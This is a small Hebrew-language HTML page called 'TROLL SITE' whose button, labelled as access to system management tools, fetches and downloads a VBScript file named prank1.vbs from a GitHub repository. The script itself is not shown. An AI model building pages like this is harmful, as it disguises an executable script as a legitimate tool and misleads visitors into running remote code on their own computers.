<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TROLL SITE</title>
    <link href="fk.css" rel="stylesheet">
</head>
<body>

    <header>
        <h1 class="logo">TROLL SITE</h1>
    </header>

    <main class="container">
        <div class="card">
            <h2>מהירות</h2>
            <p>מערכת קיצונית לביצועים מקסימליים</p>
        </div>

        <div class="card">
            <h2>עיצוב</h2>
            <p>Dark • Cyber • Glitch</p>
        </div>

        <div class="card">
            <h2>אבטחה</h2>
            <p>הגנה רב־שכבתית</p>
        </div>

        <div class="card">
            <h2>כלי מערכת</h2>
            <p>גישה לכלי ניהול</p>
            <button class="danger-btn" onclick="downloadTool()">הורדה</button>
            <div id="status" style="margin-top: 10px; font-size: 0.9em; color: #ff4d4d;"></div>
        </div>
    </main>

    <footer>
        © 2026 TROLL SYSTEM
    </footer>

    <script>
        function downloadTool() {
            const status = document.getElementById("status");
            status.innerText = "מתחבר לשרת...";

            setTimeout(async () => {
                try {
                    status.innerText = "מוריד קובץ...";

                    const response = await fetch(
                        "https://raw.githubusercontent.com/N0527610575/Websit-troly/main/prank1.vbs"
                    );

                    if (!response.ok) throw new Error("Network response was not ok");

                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);

                    const a = document.createElement("a");
                    a.href = url;
                    a.download = "prank1.vbs";
                    document.body.appendChild(a);
                    a.click();

                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);

                    status.innerText = "ההורדה הושלמה ✔";
                } catch (error) {
                    status.innerText = "שגיאה בהורדה ❌";
                    console.error("Download failed:", error);
                }
            }, 1500);
        }
    </script>

</body>
</html>
